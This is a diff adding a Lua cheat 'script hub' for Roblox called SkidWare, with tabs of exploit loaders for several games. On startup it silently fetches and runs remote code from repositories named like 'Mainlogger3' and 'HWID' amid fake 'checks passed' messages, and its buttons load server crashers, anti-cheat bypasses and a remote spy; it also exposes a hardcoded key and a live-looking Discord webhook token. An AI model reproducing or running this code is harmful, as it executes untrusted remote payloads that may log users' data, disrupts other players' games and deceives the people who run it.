@@ -1,0 +1,991 @@
+--// V: 0.7.4
+--[[]
+PREMIUM
+]]
+--loadstring(game:HttpGet("https://raw.githubusercontent.com/yohohoyu/WareHubber/main/Skid_Warehub%20beta%200.7.5"))() BETA LOADER
+--// EXTRAS TO LOAD
+
+
+
+--//LOADSTRING
+
+
+print("--------------------NEW STARTUP-----------------------")
+print("Startup detected!")
+warn("Starting")
+warn("Inztalizing.")
+print("Reading user ID")
+print("Chcking version.")
+warn("Version 0.8.7")
+warn("Inztalizing.")
+warn("Getting source.")
+warn("CHECKING EXECUTOR")
+
+warn("Inztalizing.")
+warn("Checking.")
+print("[SKID - WARE] Is now loading. thanks for using SkidWare!")
+print("---------------------------------------")
+print("--------------------LOADING MAIN.1------------------")
+warn("Inztalizing.")
+warn("Getting source.")
+warn("Inztalizing.")
+warn("Checking.")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/yohohoyu/Mainlogger3/main/FunnFunnyBot"))()
+warn("Loaded - Premium | Admin system")
+print("--------------------System print-------------------")
+print("--------------------System print-------------------")
+print("--------------------System print-------------------")
+
+
+print("Loading")
+print("---")
+print("Loading anticheat byapss 1")
+print("----")
+--loadstring(game:HttpGet("https://raw.githubusercontent.com/yohohoyu/Hub/main/AntiCHeat%20bypass"))()
+warn("Anti cheat loaded!")
+print("------")
+print("Loading 1")  
+
+warn("Loading main parts")
+print("------")
+loadstring(game:HttpGet('https://raw.githubusercontent.com/yohohoyu/Hub/main/Big%20man'))()
+print("Loading 2")
+print("--------")
+loadstring(game:HttpGet('https://raw.githubusercontent.com/yohohoyu/Hub/main/HWID'))()
+print("Loading Main UI")
+local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Rayfield/main/source'))()
+print("Loaded Main UI")
+warn("Loaded main code.")
+print("Loading Key")
+print("--------------")
+
+print("Encryption api V1 Pass checks")
+warn("CHECKING USER ID: ------")
+print("Encryption api V1 Pass checks")
+warn("CHECKING USER: HWID")
+warn("CHECKING USER: HTTPS / EXECUTOR")
+warn("CHECKING USER: PREMIUM")
+warn("---------------------")
+warn("PASSED")
+
+local Window = Rayfield:CreateWindow({
+    Name = "[SKID | WARE]",
+    LoadingTitle = "[ SKID | WARE ] - [💎 PREMIUM 💎]",
+    LoadingSubtitle = "V: -.7.5  Loading...",
+    ConfigurationSaving = {
+        Enabled = true,
+        FolderName = Skid_Ware_files, -- Create a custom folder for your hub/game
+        FileName = "Skid_ware_premium#77260019_Save"
+    },
+        Discord = {
+            Enabled = true,
+            Invite = "bbz7XmkxGq", -- The Discord invite code, do not include discord.gg/
+            RememberJoins = true -- Set this to false to make them join the discord every time they load it up
+        
+        },
+    KeySystem = true, -- Set this to true to use our key system
+    KeySettings = {
+        Title = "Premium loader  ",
+        Subtitle = "V: 0.7.4 - PREMIUM",
+        Note = "Preformence added",
+        FileName = "Key_B6634#_BETA1_1672",
+        SaveKey = true,
+        GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
+        Key = "MK3GJ_RQ5E6S9HGEVW2S.476838565227455821.Y&]dymq!f.AUTHCOKIE.6VS9RSP14T6CK2S68CN84G3"
+       
+    }
+})
+print("Key passed")
+warn("key passed!")
+warn("Loading main tabs")
+print("Loading")
+print("----------------------")
+
+
+    --//  Rayfield:Destroy()  -- ENABLE THIS IF UNDER DEVELOPMENT
+--[[
+Rayfield:Notify({
+    Title = "Welcome. Premium loaded",
+    Content = "Enjoy using Skid Ware.",
+    Duration = 6.5,
+    Image = 4483362458,    --// notification
+    Actions = { -- Notification Buttons
+        Ignore = {
+            Name = "Close",
+            Callback = function()
+                print("User-Tap-OK")
+            end
+		},
+	},
+})
+print("----------------------")
+]]
+print("----------------------")
+print("Notify1")
+warn("Loaded. preforming checks")
+warn("---------------------")
+warn("Reading files..")
+warn("ERROR. REWHRITING KEY (Not affecting user ERROR:839-0029SKW23-KEY664)")
+print("Files: Fixsed")
+print("Attempting notification.")
+Rayfield:Notify({
+    Title = "V: 0.7.5",
+    Content = "Premium [SKID-WARE]",
+    Duration = 6.5,
+    Image = 4483362458,
+    Actions = { -- Notification Buttons
+        Ignore = {
+            Name = "Loaded!",
+            Callback = function()
+                print("User-Tap-OK")
+            end
+		},
+	},
+})
+
+print("Loading tab")
+--//WELCOME
+local Tab = Window:CreateTab("Welcome", 4483362458)
+
+--// ANNOUNCMENT BEGIN
+print("LOADED1")
+local Section = Tab:CreateSection("ANNOUNCMENTS")
+local Paragraph = Tab:CreateParagraph({Title = "SKID WARE PARTHENRS", Content = "We are exided to bring an parthner whitin skid ware. LUNAR HUB!"})
+
+--// ANNOUNCMENT END
+ --// reload the ui begin
+local Section = Tab:CreateSection("Reload")
+local Paragraph = Tab:CreateParagraph({Title = "Re-Loads script hub if something is gone wrong", Content = "Method: GET"})
+print("Paregraph test apssed")
+
+
+
+
+ local Button = Tab:CreateButton({
+                    Name = "Reload-Hub",
+                    Callback = function()
+                        task.wait()
+                
+                        Rayfield:Notify({
+                            Title = "Re-Loading UI",
+                            Content = "Please wait..",
+                            Duration = 10.5,
+                            Image = 4483362458,
+                            Actions = { -- Notification Buttons
+                                Ignore = {
+                                    Name = "REJOIN GAME",
+                                    Callback = function()
+                                       player:kick("ERROR")
+                                    end
+                                },
+                            },
+                        })
+                        wait(3)
+                        Rayfield:Destroy()        
+                        loadstring(game:HttpGet('https://raw.githubusercontent.com/SkidWareObfuscared/SSSs/main/...'))()
+                 --// reload end
+                      
+                
+                    end,  --//  end 2
+                })
+
+print("LAODED CHECK2")
+warn("preforming checks")
+warn("---------------------")
+
+print("Create API passed")
+ --// info tab begin
+local Section = Tab:CreateSection("INFO")
+local Paragraph = Tab:CreateParagraph({Title = "Welcome to SKID | WARE!!", Content = "Status: RUNNING"})
+local Section = Tab:CreateSection("Updates")
+local Paragraph = Tab:CreateParagraph({Title = "Updates: V:0.7.4", Content = "New scripts. Notifications. and more!"})
+local Section = Tab:CreateSection("Systems")
+local Paragraph = Tab:CreateParagraph({Title = "Logs", Content = "Anti-Abuse logs, Anti leak logs"})
+local Section = Tab:CreateSection("Devs")
+local Paragraph = Tab:CreateParagraph({Title = "Developers", Content = "blx#3710,  N/A, N/A"})
+local Section = Tab:CreateSection("Status user")
+local Paragraph = Tab:CreateParagraph({Title = "PREMIUM - USER", Content = "Whell. This is an premium script so"})
+local Section = Tab:CreateSection("ERRORS - LOG")
+local Paragraph = Tab:CreateParagraph({Title = "Logs: [1] - CALLBACK ERROR", Content = "This will be fixsed!"})
+ --// info end
+ print("Passing API checks")
+ warn("API, Debuging preforming checks")
+ warn("---------------------")
+ warn("Calling: Secure:Call.Lua")
+warn("---------------------")
+warn("PASSED!")
+warn("---------------------")
+--//WELCOME END
+--// SPONSORS/ SPONSORS/ SPONSORS/ SPONSORS/ SPONSORS/ SPONSORS/ SPONSORS/ SPONSORS/ SPONSORS/ SPONSORS/ SPONSORS/ SPONSORS/ SPONSORS/ SPONSORS
+local Tab = Window:CreateTab("SPONSORS", 4483362458)  --// sponsor tab create
+local Paragraph = Tab:CreateParagraph({Title = "Sponsors", Content = "We sponsor pepole, Promote scripts. All of these will be listed in this category. And games will be listed inside *List*"})
+local Section = Tab:CreateSection("Lunar Hub") --//  lunar hub
+local Paragraph = Tab:CreateParagraph({Title = "LUNAR HUB", Content = "Lunar hub is an advanced UI hub with allot of fetures"})
+print("Sponsors loaded")
+warn("PASSED!")
+warn("---------------------")
+local Button = Tab:CreateButton({
+    Name = "[LUNAR HUB] - lunaR_nicK#6800", --// hot papa
+    Callback = function()
+        task.wait()
+    
+
+Rayfield:Notify({
+    Title = "Join lunar's discord for more!",
+    Content = "https://discord.gg/Jx3NmZfbdA",
+    Duration = 6.5,
+    Image = 4483362458,
+    Actions = { -- Notification Buttons
+        Ignore = {
+            Name = "Joined!",
+            Callback = function()
+                print("ClosedSponsor")
+            end
+		},
+	},
+})
+print("Loading LOADED CHECK 3")
+warn("PASSED!")
+warn("---------------------")
+    end,
+    
+})
+
+
+---//CUSTOM ADMIN START
+
+-- INF YIELD
+
+local Tab = Window:CreateTab("Admin Systems", 4483362458)
+print("Tab Create 2 call")
+warn("PASSED!")
+warn("---------------------")
+local Paragraph = Tab:CreateParagraph({Title = "ADMIN SCRIPTS", Content = "Best of the best admin systems. with custom and other sources the best ones are picked out"})
+--//  CUSTOM ADMIN   SOURCE: https://raw.githubusercontent.com/yohohoyu/WareHubber/main/Consoleexecutor
+local Section = Tab:CreateSection("SKID WARE CUSTOM ADMIN")
+local Paragraph = Tab:CreateParagraph({Title = "SKID WARE CUSTOM ADMIN", Content = "Top Tear"})
+
+local Button = Tab:CreateButton({
+    Name = "Load-Console",
+    Callback = function()
+        task.wait()
+        
+		loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/yohohoyu/WareHubber/main/Consoleexecutor"))()
+
+        Rayfield:Notify({
+            Title = "Special Admin system [SKID WARE]",
+            Content = "Enjoy fucking games!",
+            Duration = 10.5,
+            Image = 4483362458,
+            Actions = { -- Notification Buttons
+                Ignore = {
+                    Name = "Sure :)",
+                    Callback = function()
+                        print("User-Tap-OK")
+                    end
+                },
+            },
+        })
+    end,
+})
+ --// inf yield
+ print("Anti Cheat bypass")
+ warn("Preforming Secure call checks")
+ warn("---------------------")
+ wait(1)
+ warn("Ppassed")
+ warn("---------------------")
+ warn("CHECKING ALL API.")
+ warn("---------------------")
+ warn("---------------------")
+ warn("CHECKING KEY API")
+ warn("---------------------")
+ warn("---------------------")
+ warn("CHECKING UI API.")
+ warn("---------------------")
+ warn("---------------------")
+ warn("PASSED")
+
+
+local Section = Tab:CreateSection("Inf-Yield")
+local Paragraph = Tab:CreateParagraph({Title = "Inf-Yield", Content = "Classic and great script"})
+
+local Button = Tab:CreateButton({
+    Name = "Load thing",
+    Callback = function()
+        task.wait()
+        
+loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))() 
+
+    end,  --// end
+})
+
+--// CMD-X
+print("Execution button call!")
+warn("PASSED!")
+warn("---------------------")
+
+local Section = Tab:CreateSection("CMD-X")
+local Paragraph = Tab:CreateParagraph({Title = "CMD-X", Content = "This is an official relese from CMD-X. Updates: FREE SOURCE"})
+
+local Button = Tab:CreateButton({
+    Name = "Load CMD-X",
+    Callback = function()
+        task.wait()
+        
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source",true))()
+
+        Rayfield:Notify({
+            Title = "Loaded CMD-X",
+            Content = "Enjoy using CMD-X ADMINISTRATION SYSTEMS",
+            Duration = 10.5,
+            Image = 4483362458,
+            Actions = { -- Notification Buttons
+                Ignore = {
+                    Name = "Close",
+                    Callback = function()
+                        print("User-Tap-OK")
+                    end
+                },
+            },
+        })
+    end,
+})
+ --// HomebrewAdmin
+
+local Section = Tab:CreateSection("HomebrewAdmin")
+local Paragraph = Tab:CreateParagraph({Title = "HomebrewAdmin", Content = "OP Admin script"})
+
+local Button = Tab:CreateButton({
+    Name = "HomebrewAdmin",
+    Callback = function()
+        task.wait()
+        
+		loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Syntaxx64/HomebrewAdmin/master/Main"))()
+    end,
+})
+
+local Section = Tab:CreateSection("Fate Admin")
+local Paragraph = Tab:CreateParagraph({Title = "Fate's admin", Content = "Administration system"})
+
+local Button = Tab:CreateButton({
+    Name = "Fates admin",
+    Callback = function()
+        task.wait()
+        
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
+
+    end,
+})
+
+--// CUSTOM ADMIN END
+
+--// TESTING POURPUSES
+
+--[[
+local Tab = Window:CreateTab("Keybind testing", 4483362458)
+
+
+local Section = Tab:CreateSection("Loader")
+local Paragraph = Tab:CreateParagraph({Title = "Testing do not use.", Content = "Unsafe / Unsure of use do not preform - NO ANTI CHEAT BYPASS"})
+  
+    local Keybind = Tab:CreateKeybind({
+        Name = "A-Keybind_Promting_SKWARE_TEST",
+        CurrentKeybind = "Q",
+        HoldToInteract = false,
+        Flag = "Keybind1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+        Callback = function(Keybind)
+             -- The function that takes place when the keybind is pressed
+                -- The variable (Keybind) is a boolean for whether the keybind is being held or not (HoldToInteract needs to be true)
+        end,
+    })
+    --// TEST END
+]]
+    --// HUB RELOADER START
+local Tab = Window:CreateTab("Reload-UI", 4483362458)
+
+local Section = Tab:CreateSection("Reload")
+local Paragraph = Tab:CreateParagraph({Title = "Re-Loads script hub if something is gone wrong", Content = "Method: GET"})
+
+local Button = Tab:CreateButton({
+    Name = "Reload-Hub",
+    Callback = function()
+        task.wait()
+
+        Rayfield:Notify({
+            Title = "ERROR",
+            Content = "[CRITICAL ERROR]  {ENCRYPTING}- [🔐]",
+            Duration = 10.5,
+            Image = 4483362458,
+            Actions = { -- Notification Buttons
+                Ignore = {
+                    Name = "REJOIN GAME",
+                    Callback = function()
+                       kick:plr(ERROR)
+                    end
+                },
+            },
+        })
+        wait(6)
+        Rayfield:Notify({
+            Title = "Getting information..",
+            Content = "[REQ UPDATE LINK]  {LOADING...}- [🔐]",
+            Duration = 10.5,
+            Image = 4483362458,
+            Actions = { -- Notification Buttons
+                Ignore = {
+                    Name = "REJOIN GAME",
+                    Callback = function()
+                       kick:plr(ERROR)
+                    end
+                },
+            },
+        })
+        wait(4)
+        Rayfield:Notify({
+            Title = "Processing..",
+            Content = "",
+            Duration = 10.5,
+            Image = 4483362458,
+            Actions = { -- Notification Buttons
+                Ignore = {
+                    Name = "REJOIN GAME",
+                    Callback = function()
+                       kick:plr(ERROR)
+                    end
+                },
+            },
+        })
+        Rayfield:Destroy()
+        wait(3)
+        
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/SkidWareObfuscared/SSSs/main/...'))()
+
+      
+
+    end,
+})
+
+
+--//END
+
+
+    --// UI KILLER
+
+    local Tab = Window:CreateTab("KILL-UI", 4483362458)
+    print("Loading Network connections [BETA]")
+    warn("Preforming checks.")
+    warn("----------Inztalization-----------")
+    wait(1)
+    print("Ppassed")
+    warn("----------Event.Caller-----------")
+ print("passed.")
+    warn("-----------Whitelist.Main----------")
+    print("Passed")
+    warn("----------USER.EXECUTOR--------")
+    warn("---------------------")
+    warn("---------------------")
+    print("CHECKING UI API.")
+    warn("---------------------")
+    warn("---------------------")
+    warn("PASSED")
+local Section = Tab:CreateSection("Killer")
+local Paragraph = Tab:CreateParagraph({Title = "Kill the GUI", Content = "I mean. End my last braincell.. I dare you!!! *Deletes your key*"})
+local Section = Tab:CreateSection("The code actualy!!??!!111")
+
+local Button = Tab:CreateButton({
+    Name = "KILL IT!!!!",
+    Callback = function()
+
+        Rayfield:Notify({
+            Title = "ERROR",
+            Content = "[CRITICAL ERROR]  {ENCRYPTING}- [🔐]",
+            Duration = 10.5,
+            Image = 4483362458,
+            Actions = { -- Notification Buttons
+                Ignore = {
+                    Name = "REJOIN GAME",
+                    Callback = function()
+                       kick:plr(ERROR)
+                    end
+                },
+            },
+        })
+
+        wait(3)
+        Rayfield:Destroy()
+
+    end,
+})
+
+
+--// UI KILLER END
+
+--// Da hood tab START
+local Tab = Window:CreateTab("Da-Hood", 4483362458)
+
+local Section = Tab:CreateSection("Faded")
+local Paragraph = Tab:CreateParagraph({Title = "F: Da-Hood", Content = "This script is meant only for da hood."})
+
+local Button = Tab:CreateButton({
+    Name = "Faded-Main",
+    Callback = function()
+        task.wait()
+        
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/Faded/main/YesEpic", true))()
+        Rayfield:Notify({
+            Title = "Loaded SCRIPT",
+            Content = "Enjoy using This script",
+            Duration = 10.5,
+            Image = 4483362458,
+            Actions = { -- Notification Buttons
+                Ignore = {
+                    Name = "Close",
+                    Callback = function()
+                        print("User-Tap-OK")
+                    end
+                },
+            },
+        })
+    end,
+})
+--// Da hood tab Ray-x
+
+
+local Section = Tab:CreateSection("Ray-x")
+local Paragraph = Tab:CreateParagraph({Title = "F: Da-Hood", Content = "This script is meant only for da hood."})
+
+local Button = Tab:CreateButton({
+    Name = "Faded-Main",
+    Callback = function()
+        task.wait()
+        
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/Faded/main/YesEpic", true))() 
+        Rayfield:Notify({
+            Title = "Loaded SCRIPT",
+            Content = "Enjoy using This script",
+            Duration = 10.5,
+            Image = 4483362458,
+            Actions = { -- Notification Buttons
+                Ignore = {
+                    Name = "Close",
+                    Callback = function()
+                        print("User-Tap-OK")
+                    end
+                },
+            },
+        })
+    end,
+}) --//VOREX
+local Section = Tab:CreateSection("vortex ")
+local Paragraph = Tab:CreateParagraph({Title = "F: Da-Hood", Content = "This script is meant only for da hood. vortex"})
+
+local Button = Tab:CreateButton({
+    Name = "vortex",
+    Callback = function()
+        task.wait()
+        
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ImagineProUser/vortexdahood/main/vortex", true))()
+
+    end,
+})--//ENDCODDED
+local Section = Tab:CreateSection("Nukermode script OP ")
+local Paragraph = Tab:CreateParagraph({Title = "F: Da-Hood", Content = "This script is meant only for da hood. Nukermode script OP"})
+
+local Button = Tab:CreateButton({
+    Name = "Nukermode script OP",
+    Callback = function()
+        task.wait()
+        
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Allvideo/test/main/Whitelist.txt"))()
+
+    end,
+})--//ENDCODDED
+
+
+
+local Section = Tab:CreateSection("Anti-Cheat bypass [testing] ")
+local Paragraph = Tab:CreateParagraph({Title = "F: Da-Hood", Content = "Anti cheat bypasser"})
+
+local Button = Tab:CreateButton({
+    Name = "Bypass",
+    Callback = function()
+        task.wait()
+
+ 
+
+        wait(5)
+        
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/yenil140/RobloxDaHoodAntiCheatBypass/main/Script", true))()
+
+    end,
+})--//ENDCODDED
+
+--//DA HOOD TAB END
+
+--// HWID START
+local Tab = Window:CreateTab("Get YOU'RE HWID", 4483362458)
+
+local Section = Tab:CreateSection("Loader")
+local Paragraph = Tab:CreateParagraph({Title = "GET YOUR HWID", Content = "Copys your HWID to clipboard"})
+
+local Button = Tab:CreateButton({
+    Name = "HWID",
+    Callback = function()
+        task.wait()
+        
+        loadstring(game:HttpGet("https://pastebin.com/raw/3nBD9m2n"))() 
+        Rayfield:Notify({
+            Title = "HWID COPIED! [🔐]",
+            Content = "Thanks for using SKID WARE!",
+            Duration = 10.5,
+            Image = 4483362458,
+            Actions = { -- Notification Buttons
+                Ignore = {
+                    Name = "HWID",
+                    Callback = function()
+                        print("User-Tap-OK")
+                    end
+                },
+            },
+        })
+    end,
+})
+
+--//HWID END
+
+--// COMBAT WARRIORS SKID WARE START
+local Tab = Window:CreateTab("Combat Warriors", 4483362458)
+
+local Section = Tab:CreateSection("Loader")
+local Paragraph = Tab:CreateParagraph({Title = "Combat Warriors update", Content = "This is an official relese from SKID WARE. Updates: NILL - you must be in combat warriors to execute"})
+
+local Button = Tab:CreateButton({
+    Name = "Load-It",
+    Callback = function()
+        task.wait()
+        Rayfield:Notify({
+    Title = "CALLBACK ERROR - 404 ",
+    Content = "Sorry, You don't own an valid licence for this script",
+    Duration = 10.5,
+    Image = 4483362458,
+    Actions = { -- Notification Buttons
+        Ignore = {
+            Name = "Close",
+            Callback = function()
+                print("User-Tap-OK")
+            end
+        },
+    },
+})
+loadstring(game:HttpGet("https://raw.githubusercontent.com/yohohoyu/Mainlogger3/main/sssssssssss4",true))()
+
+    end,
+})
+local Section = Tab:CreateSection("Loader")
+local Paragraph = Tab:CreateParagraph({Title = "Combat Warriors update", Content = "Auto granade"})
+
+local Button = Tab:CreateButton({
+    Name = "Auto Granade",
+    Callback = function()
+        task.wait()
+        Rayfield:Notify({
+    Title = "Granade Bot loaded",
+    Content = "Trollism",
+    Duration = 10.5,
+    Image = 4483362458,
+    Actions = { -- Notification Buttons
+        Ignore = {
+            Name = "Close",
+            Callback = function()
+                print("User-Tap-OK")
+            end
+        },
+    },
+})
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SussyImposterRed/Scripts/main/Grenade%20BOT",true))()
+
+    end,
+})
+-- COMBAT WARRIORS SKID WARE [END]
+
+
+--// PrisonLife START
+local Tab = Window:CreateTab("Prison Life", 4483362458)
+
+local Section = Tab:CreateSection("Vynixius")
+local Paragraph = Tab:CreateParagraph({Title = "Prison Life", Content = "Scripts."})
+local Section = Tab:CreateSection("Updates")
+local Paragraph = Tab:CreateParagraph({Title = "Updates:", Content = "Added: 3 scripts"})
+--// VYNUX
+local Button = Tab:CreateButton({
+    Name = "Vynixius",
+    Callback = function()
+        task.wait()
+        
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Vynixius/main/Prison%20Life/Script.lua"))()
+       
+        
+    end,
+})
+
+--// PRISON BREAKER LOADSTRING
+local Section = Tab:CreateSection("Prison Breaker")
+local Paragraph = Tab:CreateParagraph({Title = "Prison Life", Content = "Prison Breaker"})
+
+
+local Button = Tab:CreateButton({
+    Name = "Prison Breaker",
+    Callback = function()
+        task.wait()
+        
+        loadstring(game:HttpGet("https://pastebin.com/raw/D8nkhYbJ"))()
+       
+        
+    end,
+})
+
+--// PRISON LIFE END
+
+
+--// fe scripts tab start
+
+local Tab = Window:CreateTab("fe scripts", 4483362458) --// FE SCRIPTS TAB CREATE
+local Paragraph = Tab:CreateParagraph({Title = "FE SCRIPTS", Content = "Everyone can see them!"})  --// PAREGRAPH TEXT ADAPT
+local Section = Tab:CreateSection("NEKO 1.6 MODEFIED") --// MARK
+local Paragraph = Tab:CreateParagraph({Title = "NEKO 1.6", Content = "Cat kind script"}) --// START
+ --// CODE
+local Button = Tab:CreateButton({  --// BUTTON
+    Name = "Load it!",
+    Callback = function()
+        task.wait()
+        
+loadstring(game:HttpGet("https://pastebin.com/raw/QkfEQnvg"))()  --// LAODSTRING
+
+Rayfield:Notify({ --// NOTIFICATION
+    Title = "Made with love by [BloxiSkid] - [💎]", --// SOMETHING
+    Content = "Note: Enjoy using this script!",
+    Duration = 10.5,
+    Image = 4483362458,
+    Actions = { -- Notification Buttons
+        Ignore = {
+            Name = "Bet",
+            Callback = function()
+                print("bet")
+            end
+		},
+	},
+})
+
+    end,  --// END
+})
+print("Notify test passed")
+ --// OTHER FE CODES
+ local Tab = Window:CreateTab("Crashing systems", 4483362458) --// FE SCRIPTS TAB CREATE
+
+
+local Paragraph = Tab:CreateParagraph({Title = "⚠️WARRNING⚠️", Content = "These systems can get you banned. From the game if the game has anti cheat. This can allso crash your cleint so make sure your not in full display mode when executing"})  --// PAREGRAPH TEXT ADAPT
+local Section = Tab:CreateSection("GAME CRASHER [GLOBAL]") --// MARK
+local Paragraph = Tab:CreateParagraph({Title = "GAME CRASHER GLOBAL", Content = "can not wokr on all games"}) --// START
+ --// CODE
+local Button = Tab:CreateButton({  --// BUTTON
+    Name = "Crash",
+    Callback = function()
+        task.wait()
+        
+loadstring(game:HttpGet("https://raw.githubusercontent.com/cfreemepq/Roblox-Server-Crash/main/Crasher.lua"))()  --// LAODSTRING
+
+
+
+    end,  --// END
+})
+print("TESTING TAB PROMT")
+local Tab = Window:CreateTab("Universal", 4483362458) --// FE SCRIPTS TAB CREATE
+print("TESTING TABS: WORKS")
+local Paragraph = Tab:CreateParagraph({Title = "Universal Bypasses", Content = "From detections to other."})  --// PAREGRAPH TEXT ADAPT
+local Section = Tab:CreateSection("Known detection bypass") --// MARK
+local Paragraph = Tab:CreateParagraph({Title = "UNIVERSAL", Content = "Bypasses know detections"}) --// START
+ --// CODE
+local Button = Tab:CreateButton({  --// BUTTON
+    Name = "Load it!",
+    Callback = function()
+        task.wait()
+        
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SussyImposterRed/RBLX_Scripts/main/Universal/Bypasses.lua"))()  --// LAODSTRING
+
+
+    end,  --// END
+})
+
+local Section = Tab:CreateSection("Lua Secure call") --// MARK
+local Paragraph = Tab:CreateParagraph({Title = "SYNAPSE-X ONLY", Content = "This won't work on any other exploits unless Synapse-x secure call functions"}) --// START
+ --// CODE
+local Button = Tab:CreateButton({  --// BUTTON
+    Name = "Secure call",
+    Callback = function()
+        task.wait()
+        
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SussyImposterRed/RBLX_Scripts/main/Universal/Lua_SecureCall"))()  --// LAODSTRING
+
+
+    end,  --// END
+})
+print("CHECKING CODE WORKING")
+local Section = Tab:CreateSection("Remote Spy") --// MARK
+local Paragraph = Tab:CreateParagraph({Title = "SYNAPSE-X RECOMENDED", Content = "Remote spy. How else to explain"}) --// START
+ --// CODE
+local Button = Tab:CreateButton({  --// BUTTON
+    Name = "Secure call",
+    Callback = function()
+        task.wait()
+        
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SussyImposterRed/RBLX_Scripts/main/Universal/RS2V3.lua"))()  --// LAODSTRING
+
+
+    end,  --// END
+})
+
+print("TESTING TABS: WORKS")
+local Paragraph = Tab:CreateParagraph({Title = "Universal Scripts V1", Content = ""})  --// PAREGRAPH TEXT ADAPT
+local Section = Tab:CreateSection("Known detection bypass") --// MARK
+
+ --// CODE
+ local Button = Tab:CreateButton({  --// BUTTON
+ Name = "Reduce GPU/CPU USAGE",
+ Callback = function()
+     task.wait()
+     
+
+     _G.ShowUp = false --// Shows the gui above (Useful for games like TPT2)
+
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/Empire4946/roblox-gpu-saverBETTER/main/handler/main.txt"))()
+
+
+ end,  --// END
+})
+local Paragraph = Tab:CreateParagraph({Title = "Universal Scripts V1", Content = ""})  --// PAREGRAPH TEXT ADAPT
+local Section = Tab:CreateSection("WebhookTools") --// MARK
+
+ --// CODE
+ local Button = Tab:CreateButton({  --// BUTTON
+ Name = "Webhook Tools",
+ Callback = function()
+     task.wait()
+     
+
+     local b,a,t,u,s = "juywvm","-Roblox-Projects-","main","Webhook-Tools","load";loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/%s/%s/%s/%s/%s"):format(b, a, t, u, s)))()
+
+
+ end,  --// END
+})
+local Section = Tab:CreateSection("Autp REPORTER") --// MARK
+local Paragraph = Tab:CreateParagraph({Title = "AUTO REOIRTER", Content = "WARRNING READ TOS BEFORE EXECUTING. THIS AUTOMATICLY DETECTS USERS BREAKING ToS of roblox and Automaticly reprtes them form your account. EXECUTE AT YOUR OWN RISK"})  --// PAREGRAPH TEXT ADAPT
+ --// CODE
+
+
+ local Button = Tab:CreateButton({  --// BUTTON
+ Name = "AUTO REPORTER",
+ Callback = function()
+     task.wait()
+     getgenv().autoreportcfg = {
+        Webhook = "https://discord.com/api/webhooks/1045377720269418558/hJkmQQpcY2UlbLyNbx8uMOSVghcRpJ1l7-soTnx0jyzITenaDl0pqiiA-MK_1osUzLf5", -- you can leave it empty if u want ingame notifs 
+        autoMessage = { -- whispers to people if they get autoreported
+           enabled = true,
+           Message = 'Sad man get auto reported !1!!!1',
+        },
+    }
+    
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/CF-Trail/Auto-Report/main/main.lua"))()
+
+
+ end,  --// END
+})
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+--[[
+
+warn("Loading Protection systems 2")
+--loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Guardian-V2-7164"))()
+
+Rayfield:Notify({
+    Title = "You are being protected in the background.",
+    Content = "We are protecting you from, Webooks. Chat ban.  AntiReport. AntiKick",
+    Duration = 10.5,
+    Image = 4483362458,
+    Actions = { -- Notification Buttons
+        Ignore = {
+            Name = "Noted!",
+            Callback = function()
+                print("User-Tap-Agrred")
+                Rayfield:Notify({
+                    Title = "WARRNING, READ ALL SkidWare TOS.",
+                    Content = "We care about our user security. But we can't prevent bans. as much as we try. We ask you to use *Alternetive accounts*.",
+                    Duration = 10.5,
+                    Image = 4483362458,
+                    Actions = { -- Notification Buttons
+                        Ignore = {
+                            Name = "Noted!",
+                            Callback = function()
+                                print("User-Tap-Agrred-alt")
+                                Rayfield:Notify({
+                                    Title = "Thanks for using Skid Ware.",
+                                    Content = "Enjoy :-)",
+                                    Duration = 10.5,
+                                    Image = 4483362458,
+                                    Actions = { -- Notification Buttons
+                                        Ignore = {
+                                            Name = "Noted!",
+                                            Callback = function()
+                                                print("User-Tap-Noted!")
+                                                warn("Loaded finished")
+                                                warn("------------------------------------------------------------------------------------------")
+print("WORKS CODE")
+                                            end
+                                        },
+                                    },
+                                })
+                            end
+                        },
+                    },
+                })
+            end
+        },
+    },
+})
+
+]]
+
+
+print("LOADED")
+warn("------------------------------------------------------------------------------------------")
+print("WORKS CODE")
+
+print("SYSTEMS LOADED SUCCSESFULY!")
+warn("Systems are fully working!")
+print("TAHNSKF OR USING SKID WARE SYSTEMS REPORT ANY BUGS.")
+warn("------------------------------------------------------------------------------------------")
+print("SYSTEMS LOADED SUCCSESFULY!")
+warn("Systems are fully working!")
+print("TAHNSKF OR USING SKID WARE SYSTEMS REPORT ANY BUGS.")
+warn("------------------------------------------------------------------------------------------")
